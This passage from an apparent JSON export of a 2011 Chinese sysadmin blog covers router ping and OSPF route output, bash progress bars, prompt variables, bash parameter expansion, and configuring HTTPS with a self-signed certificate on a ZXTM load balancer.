210.1.12.1, timeout is 2 seconds:\n!!!!!\nSuccess rate is 100 percent (5/5), round-trip min/avg/max = 40/99/148 ms\n01r3(config-if)#do ping 1.1.1.1</p>\n\n<p>Type escape sequence to abort.\nSending 5, 100-byte ICMP Echos to 1.1.1.1, timeout is 2 seconds:\n!!!!!\nSuccess rate is 100 percent (5/5), round-trip min/avg/max = 16/95/252 ms\n01r3(config-if)#do ping 11.11.11.11</p>\n\n<p>Type escape sequence to abort.\nSending 5, 100-byte ICMP Echos to 11.11.11.11, timeout is 2 seconds:\n!!!!!\nSuccess rate is 100 percent (5/5), round-trip min/avg/max = 36/104/240 ms</p>\n\n<p>01r3(config-if)#do sh ip route\nCodes: C - connected, S - static, R - RIP, M - mobile, B - BGP\nD - EIGRP, EX - EIGRP external, O - OSPF, IA - OSPF inter area\nN1 - OSPF NSSA external type 1, N2 - OSPF NSSA external type 2\nE1 - OSPF external type 1, E2 - OSPF external type 2\ni - IS-IS, su - IS-IS summary, L1 - IS-IS level-1, L2 - IS-IS level-2\nia - IS-IS inter area, * - candidate default, U - per-user static route\no - ODR, P - periodic downloaded static route</p>\n\n<p>Gateway of last resort is not set</p>\n\n<p>1.0.0.0/32 is subnetted, 1 subnets\nO IA    1.1.1.1 [110/129] via 210.1.23.2, 00:01:28, Serial0/0\n2.0.0.0/32 is subnetted, 1 subnets\nO       2.2.2.2 [110/65] via 210.1.23.2, 00:01:28, Serial0/0\n33.0.0.0/32 is subnetted, 1 subnets\nC       33.33.33.33 is directly connected, Loopback1\n3.0.0.0/32 is subnetted, 1 subnets\nC       3.3.3.3 is directly connected, Loopback0\nO IA 210.1.12.0/24 [110/128] via 210.1.23.2, 00:01:28, Serial0/0\n22.0.0.0/32 is subnetted, 1 subnets\nO       22.22.22.22 [110/65] via 210.1.23.2, 00:01:28, Serial0/0\nC    210.1.23.0/24 is directly connected, Serial0/0\n11.0.0.0/32 is subnetted, 1 subnets\nO IA    11.11.11.11 [110/129] via 210.1.23.2, 00:01:28, Serial0/0</pre></p>\n",
    "date": {
      "year": "2011",
      "month": "March",
      "day": "30"
    }
  },
  {
    "id": 47,
    "title": "shell  进度条",
    "category": "Bash Shell",
    "tags": [
      "进度条"
    ],
    "url": "/archives/shell-%E8%BF%9B%E5%BA%A6%E6%9D%A1/",
    "content": "<p>我想要实现的是根据任务完成度实现进度条显示，但是以下前4种都是设定了循环时间，主要是产生一种进度的效果：</p>\n\n<p>1 以下格式：</p>\n\n<p><pre class=\"sh_bash\">[root@server ~]# sh test1.sh</p>\n\n<p>progress:[##################################################]100% </pre></p>\n\n<p><pre class=\"sh_bash\">[root@server ~]# cat test1.sh</p>\n\n<p>#!/bin/sh</p>\n\n<p>b=''</p>\n\n<p>for ((i=0;$i&lt;=100;i+=2))</p>\n\n<p>do</p>\n\n<p>printf \"progress:[%-50s]%d%%\\r\" $b $i</p>\n\n<p>sleep 0.1</p>\n\n<p>b=#$b</p>\n\n<p>done</p>\n\n<p>echo '' </pre></p>\n\n<p><!--more--></p>\n\n<p>2  以下格式：</p>\n\n<p><pre class=\"sh_bash\">[root@server ~]# sh test2.sh</p>\n\n<p>==============================================&gt;   92% </pre></p>\n\n<p><pre class=\"sh_bash\">[root@server ~]# cat test2.sh</p>\n\n<p>#!/bin/bash</p>\n\n<p>i=0</p>\n\n<p>while [ $i -lt 50 ]</p>\n\n<p>do</p>\n\n<p>((i++))</p>\n\n<p>echo -ne \"=&gt;\\033[s\"</p>\n\n<p>echo -ne \"\\033[40;55H\"$((i*2*100/100))%\"\\033[u\\033[1D\"</p>\n\n<p>usleep 50000</p>\n\n<p>done</p>\n\n<p>echo '' </pre></p>\n\n<p>或者:</p>\n\n<p><pre class=\"sh_bash\">[root@server ~]# sh test2.sh</p>\n\n<p>[========================================&gt;                                                           ]41%</pre></p>\n\n<p><pre class=\"sh_bash\">[root@server ~]# cat test2.sh</p>\n\n<p>#!/bin/bash</p>\n\n<p>COUNTER=0</p>\n\n<p>_R=0</p>\n\n<p>_C=`tput cols`</p>\n\n<p>_PROCEC=`tput cols`</p>\n\n<p>tput cup $_C $_R</p>\n\n<p>printf \"[\"</p>\n\n<p>while [ $COUNTER -lt 100 ]</p>\n\n<p>do</p>\n\n<p>COUNTER=`expr $COUNTER + 1`</p>\n\n<p>sleep 0.1</p>\n\n<p>printf \"=&gt;\"</p>\n\n<p>_R=`expr $_R + 1`</p>\n\n<p>_C=`expr $_C + 1`</p>\n\n<p>tput cup $_PROCEC 101</p>\n\n<p>printf \"]%d%%\" $COUNTER</p>\n\n<p>tput cup $_C $_R</p>\n\n<p>done</p>\n\n<p>printf \"\\n\"</pre></p>\n\n<p>3  直线的原地旋转：</p>\n\n<p><pre class=\"sh_bash\">[root@server ~]# cat test3.sh</p>\n\n<p>#!/bin/sh</p>\n\n<p>trap 'kill $BG_PID;echo;exit' 1 2 3 15</p>\n\n<p>function rotate</p>\n\n<p>{</p>\n\n<p>INTERVAL=0.1</p>\n\n<p>TCOUNT=\"0\"</p>\n\n<p>stty -echo &gt;/dev/null 2&gt;&amp;1</p>\n\n<p>while :</p>\n\n<p>do</p>\n\n<p>TCOUNT=`expr $TCOUNT + 1`</p>\n\n<p>case $TCOUNT in</p>\n\n<p>\"1\") echo -e '-'\"\\b\\c\"</p>\n\n<p>sleep $INTERVAL</p>\n\n<p>;;</p>\n\n<p>\"2\") echo -e '\\\\'\"\\b\\c\"</p>\n\n<p>sleep $INTERVAL</p>\n\n<p>;;</p>\n\n<p>\"3\") echo -e \"|\\b\\c\"</p>\n\n<p>sleep $INTERVAL</p>\n\n<p>;;</p>\n\n<p>\"4\") echo -e \"/\\b\\c\"</p>\n\n<p>sleep $INTERVAL</p>\n\n<p>;;</p>\n\n<p>*) TCOUNT=\"0\" ;;</p>\n\n<p>esac</p>\n\n<p>done</p>\n\n<p>stty echo</p>\n\n<p>}</p>\n\n<p>rotate &amp;</p>\n\n<p>ROTATE_PID=$!</p>\n\n<p>#</p>\n\n<p># #开始程序主体，本例中执行休眠10秒</p>\n\n<p># #注意必要时使用 &gt;/dev/null 2&gt;&amp;1关闭输出和错误回显，避免破坏显示</p>\n\n<p>sleep 10</p>\n\n<p>#</p>\n\n<p># #程序结尾注意kill dots，否则dots会一直执行；清除多余字符</p>\n\n<p>kill -9 $ROTATE_PID</p>\n\n<p>echo -e \"\\b\\b\"</pre></p>\n\n<p>4  以下格式：</p>\n\n<p><pre class=\"sh_bash\">[root@server ~]# sh test5.sh</p>\n\n<p>35% .......</pre></p>\n\n<p><pre class=\"sh_bash\">[root@server ~]# cat test5.sh</p>\n\n<p>#!/bin/sh</p>\n\n<p>echo</p>\n\n<p>for i in `seq 1 20`; do</p>\n\n<p>arrow=\"$arrow.\"</p>\n\n<p>echo -e \"\\e[A\\e[0G$[i*5]% $arrow\"</p>\n\n<p>echo -e \"\\e[A\\e[50G\"</p>\n\n<p>sleep 1</p>\n\n<p>done</pre></p>\n\n<p>5  外国一高手写得bar.sh：</p>\n\n<p><a href=\"http://www.dongwm.com/bar.sh\" target=\"_blank\">下载地址</a></p>\n\n<p><pre class=\"sh_bash\">使用举例：</p>\n\n<p>cat file1 file2 file2 &gt; file3</p>\n\n<p>With Progress Bar:</p>\n\n<p>bar file1 file2 file2 &gt; file3</p>\n\n<p>cp infile outfile</p>\n\n<p>With Progress Bar:</p>\n\n<p>bar -o outfile infile</p>\n\n<p>Copy several files to another directory (showing a common progress bar)</p>\n\n<p>Standard:</p>\n\n<p>cp file1 file2 file2 outdir/</p>\n\n<p>With Progress Bar:</p>\n\n<p>bar -c 'cat &gt; outdir/${bar_file}' file1 file2 file3</p>\n\n<p>Unpack each file individually, but have a common progress bar</p>\n\n<p>Standard:</p>\n\n<p>for i in *.tar.gz; do tar xzpf $i; done</p>\n\n<p>With Progress Bar:</p>\n\n<p>bar -c 'tar xzpf -' *.tar.gz</p>\n\n<p>Make a File Listing</p>\n\n<p>We don't want to mention ‘.tar.gz’ in the listing, so we use ‘-e’ to append an extension in each command.</p>\n\n<p>Standard:</p>\n\n<p>(for file in erwin-2.0.274 bar-1.0-src linux-2.4.21</p>\n\n<p>do</p>\n\n<p>echo ${file}:</p>\n\n<p>tar tzvpf ${file}.tar.gz</p>\n\n<p>done) &gt; package-list.txt</p>\n\n<p>With Progress Bar:</p>\n\n<p>bar -c 'echo ${bar_file}: ; tar tzvpf -' \\</p>\n\n<p>-e .tar.gz                           \\</p>\n\n<p>erwin-2.0.274                    \\</p>\n\n<p>bar-1.0-src                      \\</p>\n\n<p>linux-2.4.21                     \\</p>\n\n<p>&gt; package-list.txt</pre></p>\n",
    "date": {
      "year": "2011",
      "month": "March",
      "day": "31"
    }
  },
  {
    "id": 48,
    "title": "PS1,PS2,PS3,PS4和PROMPT_COMMAND",
    "category": "linux基础",
    "tags": [
      "PROMPT_COMMAND",
      "PS1",
      "PS2",
      "PS3",
      "PS4"
    ],
    "url": "/archives/ps1ps2ps3ps4%E5%92%8Cprompt_command/",
    "content": "<p><strong>1 PS1——默认提示符</strong></p>\n\n<p>默认的是“\\u@\\h \\W”，这里我设定现实用户，主机名，当前目录：</p>\n\n<p><pre class=\"sh_bash\">[root@client ~]# cd /tmp/\n[root@client tmp]# export PS1=\"\\u@\\h \\w&gt; \"\nroot@client /tmp&gt; cd /etc/sysconfig/\nroot@client /etc/sysconfig&gt;</p>\n\n<p>export PS1=”\\u@\\h \\w&gt;\" 添加到.bash_profile 或者 .bashrc中，则可以保证其永久有效。</p>\n\n<p>root@client /etc/sysconfig&gt; echo 'export PS1=\"\\u@\\h \\w&gt; \"' &gt;&gt;~/.bash_profile</p>\n\n<p>root@client /etc/sysconfig&gt; echo 'export PS1=\"\\u@\\h \\w&gt; \"' &gt;&gt;/etc/bashrc</pre></p>\n\n<p>注：以上添加一项就好</p>\n\n<p><strong>2  一个非常长的命令可以通过在末尾加“\\”使其分行显示。多行命令的默认提示符是“&gt;”。 我们可以通过修改PS2 ，将提示符修改为\"go on-&gt;\"</strong></p>\n\n<p><strong>3  用环境变量PS3定制shell脚本的select提示</strong></p>\n\n<p><a href=\"mailto:ps3root@client\">未使用PS3</a>：</p>\n\n<p><pre class=\"sh_bash\">root@client ~# sh test.sh\n1) mon\n2) tue\n3) wed\n4) exit\n#?   //缺省是#？\nroot@client ~# cat !$\ncat test.sh\nselect i in mon tue wed exit\ndo\ncase $i in\nmon) echo \"Monday\";;\ntue) echo \"Tuesday\";;\nwed) echo \"Wednesday\";;\nexit) exit;;\nesac\ndone</pre></p>\n\n<p>使用PS3：</p>\n\n<p><pre class=\"sh_bash\">root@client ~&gt; sh !$\nsh test.sh\n1) mon\n2) tue\n3) wed\n4) exit\nSelect a day (1-4):\nroot@client ~&gt; cat !$\ncat test.sh\nPS3=\"Select a day (1-4): \"\nselect i in mon tue wed exit\ndo\ncase $i in\nmon) echo \"Monday\";;\ntue) echo \"Tuesday\";;\nwed) echo \"Wednesday\";;\nexit) exit;;\nesac\ndone</pre></p>\n\n<p><strong>4  PS4-“set -x\"用来修改跟踪输出的前缀,此例我想实现调试脚本定位相应的行号：</strong></p>\n\n<p>未使用PS4：</p>\n\n<p><pre class=\"sh_bash\">[root@server ~]# cat test.sh\n#!/bin/bash\nset -x\nls -l /tmp|wc -l\nls -l /opt|wc -l\n[root@server ~]# sh test.sh\n+ ls -l /tmp\n+ wc -l\n6\n+ ls -l /opt\n+ wc -l\n1</pre></p>\n\n<p>使用PS4：</p>\n\n<p><pre class=\"sh_bash\">[root@server ~]# cat test.sh\n#!/bin/bash\nexport PS4='$0.$LINENO+ '  //$LINENO+ 表示当前的行号\nset -x\nls -l /tmp|wc -l\nls -l /opt|wc -l\n[root@server ~]# sh test.sh\ntest.sh.4+ ls -l /tmp\ntest.sh.4+ wc -l\n6\ntest.sh.5+ ls -l /opt\ntest.sh.5+ wc -l\n1</p>\n\n<p>set –x的命令提示符修改成“ 脚本名.行号”</pre></p>\n\n<p><strong>5 Bash在显示PS1之前先执行PROMPT_COMMAND定义的内容：</strong></p>\n\n<p><pre class=\"sh_bash\">[root@server ~]# export PROMPT_COMMAND=\"date +%k:%m:%S\"\n21:02:06\n[root@server ~]#</p>\n\n<p>先是在一行内 加-n</p>\n\n<p>[root@server ~]# export PROMPT_COMMAND=\"echo -n [$(date +%k:%m:%S)]\"\n[21:02:31][root@server ~]# </pre></p>\n\n<p><strong>6  在PS1提示符里显示当前时间：</strong></p>\n\n<p><pre class=\"sh_bash\">export PS1=\"[\\<a>u@\\h</a> [\\$(date+%k:%m:%S)]] \"</p>\n\n<p>[root@server ~[21:02:49]] </pre></p>\n\n<p><strong>7  任意命令的输出作为提示符</strong></p>\n\n<p>你可以在提示里显示任意LINUX命令的输出，下列命令显示了三项信息，以\"｜\" 做分隔：</p>\n\n<p><pre class=\"sh_bash\">[root@server ~]# kernel_version=$(uname -r)\n[root@server ~]# export PS1=\"[\\u@\\h|$kernel_version|\\W] \" //将上面设定的变量引用\n[root@server|2.6.18-194.el5xen|~] </pre></p>\n\n<p><strong>8  改变提示符的前景颜色</strong></p>\n\n<p>用蓝色显示提示符中的用户名，主机名，和当前目录信息:</p>\n\n<p><pre class=\"sh_bash\">export PS1=\"\\e[0;34m[\\u@\\h \\W] \\e[m \"\n[root@server ~]</p>\n\n<p>其中 \\e[ ——表示颜色的提示的起始位置</p>\n\n<p>x;ym ——表示颜色的代码。颜色的代码在下面有说明</p>\n\n<p>\\e[m ——表示代颜色的提示的结束位置</p>\n\n<p>可以选择的编码如下所示：</p>\n\n<p>编码 颜色/动作</p>\n\n<p>0    重新设置属性到缺省设置</p>\n\n<p>1    设置粗体</p>\n\n<p>2    设置一半亮度（模拟彩色显示器的颜色）</p>\n\n<p>4    设置下划线（模拟彩色显示器的颜色）</p>\n\n<p>5    设置闪烁</p>\n\n<p>7    设置反向图象</p>\n\n<p>22  设置一般密度</p>\n\n<p>24  关闭下划线</p>\n\n<p>25  关闭闪烁</p>\n\n<p>27  关闭反向图象</p>\n\n<p>30  设置黑色前景</p>\n\n<p>31  设置红色前景</p>\n\n<p>32  设置绿色前景</p>\n\n<p>33  设置棕色前景</p>\n\n<p>34  设置蓝色前景</p>\n\n<p>35  设置紫色前景</p>\n\n<p>36  设置青色前景</p>\n\n<p>37  设置白色前景</p>\n\n<p>38  在缺省的前景颜色上设置下划线</p>\n\n<p>39  在缺省的前景颜色上关闭下划线</p>\n\n<p>40  设置黑色背景</p>\n\n<p>41  设置红色背景</p>\n\n<p>42  设置绿色背景</p>\n\n<p>43  设置棕色背景</p>\n\n<p>44  设置蓝色背景</p>\n\n<p>45  设置紫色背景</p>\n\n<p>46  设置青色背景</p>\n\n<p>47  设置白色背景</p>\n\n<p>49  设置缺省黑色背景</p>\n\n<p>一个脚本对照表为：</p>\n\n<p><a href=\"http://www.dongwm.com/wp-content/uploads/2011/04/Screenshot.png\"><img class=\"alignnone size-full wp-image-471\" title=\"Screenshot\" src=\"http://www.dongwm.com/wp-content/uploads/2011/04/Screenshot.png\" alt=\"\" width=\"579\" height=\"296\" /></a></p>\n\n<p>首先请查找您要使用的颜色，然后查找对应的前景编号 (30-37) 和背景编号 (40-47)。例如，如果您喜欢黑底绿字，则可将编号分别设为 32 和 40。然后打开您的提示行定义并在其中添加适当的颜色代码。</p>\n\n<p>将其写入~/.bashrc或~/.bash_profile可以使其永久生效</pre></p>\n\n<p><strong>9  改变提示符的背景色</strong></p>\n\n<p>在PS1变量用“/e{code}m”语句改变提示符的背景色：</p>\n\n<p><pre class=\"sh_bash\">[root@server ~]  export PS1=\"\\e[45m\\u@\\h \\w&gt; \\e[m \"\nroot@server ~&gt;</p>\n\n<p>同事改变前景和背景：</p>\n\n<p>export PS1=\"\\e[0;33m\\e[45m[\\u@\\h \\w] \\e[m \"\n[root@server ~]  </pre></p>\n\n<p><strong>10  在提示符中显示多种颜色</strong></p>\n\n<p>在~/bashrc中加入下面的函数就可以在提示符中显示多种颜色。</p>\n\n<p><pre class=\"sh_bash\">function prompt {\nlocal BLUE=\"\\[\\033[0;34m\\]\"\nlocal DARK_BLUE=\"\\[\\033[1;34m\\]\"\nlocal RED='\\[\\033[0;31m\\]'\nlocal DARK_RED='\\[\\033[1;31m\\]'\nlocal NO_COLOR='\\[\\033[0m\\]'\ncase $TERM in\nxterm*|rxvt*)\nTITLEBAR=\"\\[\\033]0;\\u@\\h:\\w\\007\\]\"\n;;\n*)\nTITLEBAR=\"\" ;;\nesac\nPS1=\"\\u@\\h [\\t]&gt; \"\nPS1=\"${TITLEBAR}\\ $BLUE\\u@\\h $RED[\\t]&gt;$NO_COLOR \"\nPS2=\"continue-&gt; \"\nPS4=\"$0.$LINENO+ \"\n}</p>\n\n<p>然后重新登录或通过“source”命令就可以让上述函数生效</p>\n\n<p>root@server [22:03:40]&gt; prompt\n\\ root@server [22:04:19]&gt;   //自己看效果把</pre></p>\n\n<p><strong>11  用tput改变提示符颜色</strong></p>\n\n<p><pre class=\"sh_bash\">[root@server ~]# export PS1=\"\\[$(tput bold)$(tput setb 4)$(tput setaf 7)\\]\\u@\\h:\\w $ \\[$(tput sgr0)\\]\"\nroot@server:~ $</p>\n\n<p>tput设置颜色的方法：</p>\n\n<p>tput setab [1-7] - 通过ANSI转义设置背景色</p>\n\n<p>tput setb [1-7] - 设置背景色</p>\n\n<p>tput setaf [1-7] - 通过ANSI转义符设置前景色</p>\n\n<p>tput setf [1-7] - 设置前景颜色 tput设置文本的方法：</p>\n\n<p>tput bold - 设置粗体</p>\n\n<p>tput dim - 打开半光亮模式</p>\n\n<p>tput smul - 开始下划线</p>\n\n<p>tput rmul - 退出下划线模式</p>\n\n<p>tput rev - 打开反转模式</p>\n\n<p>tput smso - 进入突出显示模式</p>\n\n<p>tput rmso - 退出突出显示模式</p>\n\n<p>tput sgr0 - 关闭所有属性</p>\n\n<p>tput的颜色码：  0 – 黑  1 – 红  2 – 绿  3 – 黄  4 – 蓝  5 – 洋红  6 – 青  7 – 白</pre></p>\n\n<p><strong>12  通过PS1调用bash shell函数</strong></p>\n\n<p><pre class=\"sh_bash\">root@server:~ $ function httpdcount {\n&gt; ps -ef |grep httpd|grep -v grep |wc -l\n&gt; }\nroot@server:~ $ export PS1=\"[\\u@\\h \\W[`httpdcount`] \"  //显示当前运行的httpd 进程的总数\n[root@server ~[9] </pre></p>\n\n<p><strong>13  通过PS1中调用shell脚本</strong></p>\n\n<p><pre class=\"sh_bash\">[root@server ~[12]&gt; cat /opt/dongwm.sh\n#!/bin/bash\nps -ef |grep httpd|grep -v grep |wc -l</p>\n\n<p>export PS1=\"[\\u@\\h \\W[\\$(dongwm.sh)]&gt; \"\n[root@server ~[12]&gt; </pre></p>\n",
    "date": {
      "year": "2011",
      "month": "April",
      "day": "06"
    }
  },
  {
    "id": 49,
    "title": "Shell 高级变量",
    "category": "Bash Shell",
    "tags": [
      "shell",
      "高级变量"
    ],
    "url": "/archives/shell-%E9%AB%98%E7%BA%A7%E5%8F%98%E9%87%8F/",
    "content": "<p><strong>1 测试变量存在与否:</strong>\n语法 ${变量-默认值}\n若变量不存在换回-后面的默认值,要存在传回变量值\n<pre class=\"sh_bash\">[root@server ~]# unset dongwm\n[root@server ~]# r=${dongwm-'not exist'}\n[root@server ~]# echo $r\nnot exist\n[root@server ~]# dongwm=hello\n[root@server ~]# r=${dongwm-'not exist'}\n[root@server ~]# echo $r\nhello</pre>\n<strong>2  测试变量不存在或者为空值:</strong>\nr=${变量:-默认值}\n<pre class=\"sh_bash\">[root@server ~]# unset dongwm\n[root@server ~]# r=${dongwm:-'not exist'}\n[root@server ~]# echo $r\nnot exist\n[root@server ~]# dongwm=\n[root@server ~]# r=${dongwm:-'not exist'}\n[root@server ~]# echo $r\nnot exist</pre>\n<strong>3  测试变量不存在或者其值为空 提示错误信息</strong>\n<pre class=\"sh_bash\">[root@server test]# cat test.sh\n#!/bin/bash\nra=${1:?'错误,请提供要删除目录的名称'}\necho  '你要执行的命令是'\necho  \"rm -rf ./$ra\"\nrm -rf ./$ra\n[root@server test]# ls\ntest  test.sh\n[root@server test]# sh test.sh\ntest.sh: line 2: 1: 错误,请提供要删除目录的名称\n[root@server test]# ls\ntest  test.sh\n[root@server test]# sh test.sh test\n你要执行的命令是\nrm -rf ./test\n[root@server test]# ls\ntest.sh  //test目录被删除了</pre><!--more-->\n<strong>4  判断变量存在性 并返回特定值:</strong>\n<pre class=\"sh_bash\">[root@server test]# dongwm=hello\n[root@server test]# r=${dongwm:+'true'}\n[root@server test]# echo $r\ntrue\n[root@server test]# dongwm=\n[root@server test]# r=${dongwm:+'true'}\n[root@server test]# echo $r</p>\n\n<p>//变量不存在 所以是空值</pre></p>\n\n<p><strong>5 取字符串切片</strong>\n<pre class=\"sh_bash\">语法1 ${变量:位置起点}\n从指定位置开始一直到字符串结尾\n[root@server test]# dongwm=\"You are welcome\"\n[root@server test]# eval echo ${dongwm:5}\nre welcome\n//从位置起点+1个字符开始\n语法2 ${变量:位置起点:长度}\n从之定位置开始取特定长度字符串\n[root@server test]# eval echo ${dongwm:5:7}\nre welc  //空格也算字符</pre>\n<strong>6  取位置参数:</strong>\n<pre class=\"sh_bash\">语法1 ${@:起点}\n有起点开始 取得后面所有参数\n[root@server test]# cat test.sh\n#!/bin/bash\necho $0\necho ${@:2}\n[root@server test]# sh test.sh 1 2 3 4 5\ntest.sh\n2 3 4 5\n语法2 ${@:起点:个数}\n由起点开始取得特定个数数量的位置参数:\n<pre class=\"sh_bash\">[root@server test]# cat test.sh\n#!/bin/bash\necho $0\necho ${@:2:2}\n[root@server test]# sh test.sh 1 2 3 4 5\ntest.sh\n2 3</pre>\n<strong>7 计算字符串长度:</strong>\n语法 ${#变量名称}\n<pre class=\"sh_bash\">[root@server test]# dongwm='You are welcome'\n[root@server test]# echo ${#dongwm}\n15\n语法拓展\n1 语法expr length \"字符串\"\n[root@server test]# expr length \"You are welcome\"\n15\n2 语法 expr \"字符串\" :'.*'\n[root@server test]# expr \"You are welcome\" : '.*'\n15</pre>\n<strong>8  有字符串对比,删除相符者:</strong>\n语法1 ${变量#样式}  //从前开始对比 最短相符\n<pre class=\"sh_bash\">[root@server test]# dongwm=\"/etc/sysconfig/network-scripts/ifdown-eth\"\n[root@server test]# eval echo ${dongwm#/*/}\nsysconfig/network-scripts/ifdown-eth  // 删除了最开始的\"/etc/\"\n语法2 ${变量##样式} //从前开始对比 最长相符\n[root@server test]# dongwm=\"/etc/sysconfig/network-scripts/ifdown-eth\"\n[root@server test]# eval echo ${dongwm##/*/}\nifdown-eth\n语法3 ${dongwm%/*/}  //从后开始对比 最短相符\n[root@server test]# dongwm=\"/etc/sysconfig/network-scripts/ifdown-eth\"\n[root@server test]# eval echo ${dongwm%/*}\n/etc/sysconfig/network-scripts\n语法4 ${变量%%样式}   //从后开始对比 最长相符\n[root@server test]# dongwm=\"www.dongwm.com\"\n[root@server test]# eval echo ${dongwm%%.*}\nwww</pre>\n<strong>9  取代或者删除字符串</strong>\n语法1 ${变量/样式/替换的字符串}\n<pre class=\"sh_bash\">[root@server test]# dongwm=\"sync:x:5:0:sync:/sbin:/bin/sync\"\n[root@server test]# eval echo ${dongwm/:/,}\nsync,x:5:0:sync:/sbin:/bin/sync  //只替换了第一个相符\n语法2 ${变量//样式/替换的字符串}\n[root@server test]# dongwm=\"sync:x:5:0:sync:/sbin:/bin/sync\"\n[root@server test]# eval echo ${dongwm//:/,}\nsync,x,5,0,sync,/sbin,/bin/sync\n注 不提换只删除 没有最后一个\"替换的字符串\"选项\n[root@server test]# eval echo ${dongwm//:/}\nsyncx50sync/sbin/bin/sync\n[root@server test]# eval echo ${dongwm/:/}\nsyncx:5:0:sync:/sbin:/bin/sync</pre></p>\n\n<p><strong>10 命令替换</strong>\n语法 $(命令)\n<pre class=\"sh_bash\">[root@server test]# dongwm=$(ls)\n[root@server test]# for f in $dongwm\n&gt; do\n&gt; echo $f\n&gt; done\ntest\ntest.sh</p>\n\n<p>[root@server test]# dongwm=\"/etc/passwd\"\n[root@server test]# IFS=\" \"\n[root@server test]# f=$(&lt; $dongwm)\n[root@server test]# echo $f\n注 IFS标示分割字符变量 它的内容包含:空格符,\\t,\\n</pre></p>\n\n<p><strong>11 算数运算</strong>\n语法 $((算数式))\n<pre class=\"sh_bash\">[root@server test]# eval echo $((1+3))\n4</pre>\n<div id=\"livemargins_control\" style=\"position: absolute; display: none; z-index: 9999;\"><img style=\"position: absolute; left: -77px; top: -5px;\" src=\"chrome://livemargins/skin/monitor-background-horizontal.png\" alt=\"\" width=\"77\" height=\"5\" /> <img style=\"position: absolute; left: 0; top: -5px;\" src=\"chrome://livemargins/skin/monitor-background-vertical.png\" alt=\"\" /> <img id=\"monitor-play-button\" style=\"position: absolute; left: 1px; top: 0; opacity: 0.5; cursor: pointer;\" onmouseover=\"this.style.opacity=1\" onmouseout=\"this.style.opacity=0.5\" src=\"chrome://livemargins/skin/monitor-play-button.png\" alt=\"\" /></div>\n<div class=\"zemanta-pixie\"><img class=\"zemanta-pixie-img\" src=\"http://img.zemanta.com/pixy.gif?x-id=96a78524-c46f-816f-a821-e23986f21990\" alt=\"\" /></div></p>\n",
    "date": {
      "year": "2011",
      "month": "April",
      "day": "08"
    }
  },
  {
    "id": 50,
    "title": "ZXTM专题二：使用ZXTM用自建ssl证书实现网站的https协议访问",
    "category": "linux基础",
    "tags": [

    ],
    "url": "/archives/zxtm%E4%B8%93%E9%A2%98%E4%BA%8C%EF%BC%9A%E4%BD%BF%E7%94%A8zxtm%E7%94%A8%E8%87%AA%E5%BB%BAssl%E8%AF%81%E4%B9%A6%E5%AE%9E%E7%8E%B0%E7%BD%91%E7%AB%99%E7%9A%84https%E5%8D%8F%E8%AE%AE%E8%AE%BF%E9%97%AE/",
    "content": "<p><b>可能一些网站的二级域名涉及交易,用户信息等敏感重要信息,所以建议使用https协议替代传统的httpd,我这里使用了负载均衡ZXTM来做这件事情.</b><b>1 创建公钥,私钥,证书</b>习惯借用linux下的openssl工具,zxtm也可以创建相应东东:[root@dongwm conf]# openssl genrsa -des3 1024 &gt; server.key&nbsp;&nbsp; //建立<a style=\"font-weight: bold; color: #ff0000\" href=\"http://www.fuancn.cn/\">服务器</a>密钥Generating RSA private key, 1024 bit long modulus........................++++++..................++++++e is 65537 (0x10001)Enter pass phrase:&nbsp;&nbsp;&nbsp; //输入密码Verifying - Enter pass phrase:&nbsp;&nbsp; //重复输入密码[root@dongwm conf]# openssl rsa -in server.key -out server.key&nbsp;&nbsp;&nbsp;&nbsp; //从密钥中删除密码Enter pass phrase for server.key:&nbsp; //输入上面写入的密码writing RSA key&nbsp;&nbsp;&nbsp; //生成了server.key[root@dongwm conf]# openssl req -new -key server.key -out server.csr&nbsp; //建立服务器公钥You are about to be asked to enter information that will be incorporatedinto your certificate request.What you are about to enter is what is called a Distinguished Name or a DN.There are quite a few fields but you can leave some blankFor some fields there will be a default value,If you enter '.', the field will be left blank.-----Country Name (2 letter code) [GB]:CN&nbsp;&nbsp; //国家名称State or Province Name (full name) [Berkshire]:Beijing //省名Locality Name (eg, city) [Newbury]:Beijing&nbsp;&nbsp; //城市名Organization Name (eg, company) [My Company Ltd]:www.dongwm.com //域名Organizational Unit Name (eg, section) []:&nbsp; //不填Common Name (eg, your name or your server's hostname) []:www.dongwm.com&nbsp; //通称&nbsp; 写域名即可Email Address []:admin@dongwm.com&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //邮箱地址Please enter the following 'extra' attributesto be sent with your certificate requestA challenge password []:&nbsp; //回车An optional company name []:&nbsp; //回车[root@dongwm conf]# openssl x509 -in server.csr -out server.crt -req -signkey server.key -days 365&nbsp; //建立<a style=\"font-weight: bold; color: #ff0000\" href=\"http://www.fuancn.cn/\">服务器</a>证书Signature ok subject=/C=CN/ST=Beijing/L=Beijing/O=www.dongwm.com/CN=www.dongwm.com/emailAddress=admin@dongwm.comGetting Private key&nbsp;&nbsp; 生成了三个文件:server.key&nbsp;&nbsp; server.crt(证书)&nbsp; server.csr(公钥)<b>2 配置ZXTM</b><b>1 添加一个POOL,添加web节点:</b><img style=\"max-width: 800px;\" src=\"http://www.dongwm.com/wp-content/uploads/2011/04/image_1.png\" /><b>2&nbsp; 添加SSL证书:</b>&nbsp;进入Catalogs--&gt;SSL页面<img style=\"max-width: 800px;\" src=\"http://www.dongwm.com/wp-content/uploads/2011/04/image_2.png\" />选择第一项<a href=\"https://58.83.184.18:9090/apps/zxtm/index.fcgi?section=SSL%3ASSL%20Certs\">SSL Certificates catalog</a>进入:<img style=\"max-width: 800px;\" src=\"http://www.dongwm.com/wp-content/uploads/2011/04/image_3.png\" />选择Import Certificate选项导入上面生成的证书和私钥:<img style=\"max-width: 800px;\" src=\"http://www.dongwm.com/wp-content/uploads/2011/04/image_41.png\" />名字随便命名,Certificate file:选择的文件是刚才生成的server.crt ,Private key file选择最开始生成的server.key,单击 Import Certificate<b>3&nbsp; 添加Virtual Servers</b>进入 Services--&gt;Virtual Servers页面 Create a new Virtual Server<img style=\"max-width: 800px;\" src=\"http://www.dongwm.com/wp-content/uploads/2011/04/image_6.png\" />注意协议为HTTP 端口为443,流量POOL是最初建的那个测试pool点开下面的<a href=\"https://58.83.184.18:9090/apps/zxtm/index.fcgi?name=test-dongwm&amp;section=Virtual%20Servers%3AEdit%3ASSL%20Decryption\">SSL Decryption</a>选项:<img style=\"max-width: 800px;\" src=\"http://www.dongwm.com/wp-content/uploads/2011/04/image_5.png\" />里面的Certificate&nbsp; 选择刚才新建的那个证书,标示最开始就是刚才给那个证书命名的名字.<b>4&nbsp; 现在配置完成,测试</b>注意我以下的表述:<font color=\"#FF0000\">点开https://你的ZXTM的Traffic&nbsp;IP 